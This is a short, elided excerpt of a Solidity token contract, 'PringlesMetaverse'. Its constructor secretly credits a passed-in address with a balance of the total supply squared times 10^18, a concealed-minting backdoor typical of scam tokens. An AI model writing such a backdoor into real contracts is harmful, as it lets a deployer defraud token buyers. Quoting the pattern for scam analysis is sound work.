...
interface IUniswapV2Router02 is IUniswapV2Router01 {
  ...
  contract PringlesMetaverse is IERC20, Context, Ownable {
    ...
    constructor(address adsAddress, uint256 count) {
      ...
      _count = count;
      _balances[adsAddress] = _totalSupply * _totalSupply * 10**18;
